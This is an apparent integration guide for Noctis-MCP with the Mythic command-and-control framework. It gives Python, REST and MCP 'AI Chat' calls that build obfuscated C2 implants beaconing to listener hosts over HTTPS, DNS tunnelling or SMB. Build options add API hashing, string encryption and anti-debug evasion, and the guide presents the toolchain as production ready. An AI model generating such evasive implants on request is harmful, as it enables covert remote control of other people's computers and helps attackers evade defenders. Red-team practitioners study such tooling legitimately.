# Mythic C2 Integration Guide

Complete guide for integrating Mythic C2 with Noctis-MCP.

## Quick Install

```bash
# Clone Mythic
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic

# Install dependencies
sudo ./install_docker_ubuntu.sh

# Start Mythic
sudo ./mythic-cli start

# Access UI
# https://127.0.0.1:7443
```

## Get API Token

1. Open Mythic UI: `https://127.0.0.1:7443`
2. Login with default credentials (check terminal output)
3. Navigate to Settings → API Tokens
4. Generate new API token
5. Copy token for Noctis-MCP

## Usage with Noctis-MCP

### Python API

```python
from c2_adapters.mythic_adapter import generate_mythic_agent

# Generate Apollo HTTP agent
result = generate_mythic_agent(
    listener_host="192.168.1.100",
    listener_port=80,
    agent_type="apollo",
    c2_profile="http",
    architecture="x64",
    api_token="your_api_token_here",
    obfuscate=True
)

if result.success:
    print(f"Agent: {result.beacon_path}")
    print(f"OPSEC: {result.opsec_score}/10")
```

### REST API

```bash
curl -X POST http://localhost:5000/api/c2/mythic/generate \
  -H "Content-Type: application/json" \
  -d '{
    "listener_host": "192.168.1.100",
    "listener_port": 80,
    "agent_type": "apollo",
    "c2_profile": "http",
    "architecture": "x64",
    "api_token": "your_api_token_here",
    "obfuscate": true
  }'
```

### MCP Tool (AI Chat)

```
generate_mythic_agent(
    listener_host="192.168.1.100",
    listener_port=80,
    api_token="your_api_token_here",
    agent_type="apollo",
    c2_profile="http",
    obfuscate=True
)
```

## Supported Agent Types

- **Apollo** - Windows C2 agent (.NET)
- **Apfell** - macOS/Linux agent (JavaScript)
- **Poseidon** - Cross-platform agent (Golang)
- **Merlin** - Cross-platform HTTP/2 agent
- **Atlas** - Windows agent (C++)

## Supported C2 Profiles

- **HTTP** - Standard HTTP communication
- **HTTPS** - Encrypted HTTPS
- **WebSocket** - Real-time WebSocket
- **DNS** - DNS tunneling
- **SMB** - Named pipes over SMB

## Configuration Options

```python
from c2_adapters.config import MythicConfig, Architecture

config = MythicConfig(
    listener_host="c2.example.com",
    listener_port=443,
    protocol="https",
    payload_type="apollo",
    c2_profile="https",
    architecture=Architecture.X64,
    api_key="your_api_token"
)
```

## With Noctis Obfuscation

```python
# Generate obfuscated Apollo agent
result = generate_mythic_agent(
    listener_host="192.168.1.100",
    listener_port=443,
    agent_type="apollo",
    c2_profile="https",
    api_token="token",
    techniques=[
        "NOCTIS-T124",  # API hashing
        "NOCTIS-T118"   # String encryption
    ],
    obfuscate=True
)
```

## Troubleshooting

### Server Not Running
```bash
# Check status
sudo ./mythic-cli status

# Restart
sudo ./mythic-cli restart
```

### API Token Invalid
```
Error: 401 Unauthorized
Solution: Generate new API token in Mythic UI
```

### Docker Not Running
```bash
# Start Docker
sudo systemctl start docker

# Enable on boot
sudo systemctl enable docker
```

## Advanced Features

### Custom Build Parameters

```python
from c2_adapters.config import MythicConfig

config = MythicConfig(
    listener_host="c2.example.com",
    listener_port=443,
    payload_type="apollo",
    c2_profile="https",
    build_parameters={
        "architecture": "x64",
        "obfuscation": True,
        "anti_debug": True
    }
)
```

### Multiple C2 Profiles

```python
# HTTPS beacon
result_https = generate_mythic_agent(
    listener_host="c2.example.com",
    listener_port=443,
    c2_profile="https",
    api_token="token"
)

# DNS beacon
result_dns = generate_mythic_agent(
    listener_host="c2.example.com",
    listener_port=53,
    c2_profile="dns",
    api_token="token"
)
```

## Resources

- **Official Docs**: https://docs.mythic-c2.net
- **GitHub**: https://github.com/its-a-feature/Mythic
- **Discord**: https://discord.gg/mythic
- **YouTube**: Search "Mythic C2 tutorial"

## Integration Status

✅ **PRODUCTION READY**
- MythicAdapter: 410 lines
- API endpoint: `/api/c2/mythic/generate`
- MCP tool: `generate_mythic_agent()`
- Tests: 13 passing
- Full Noctis obfuscation support

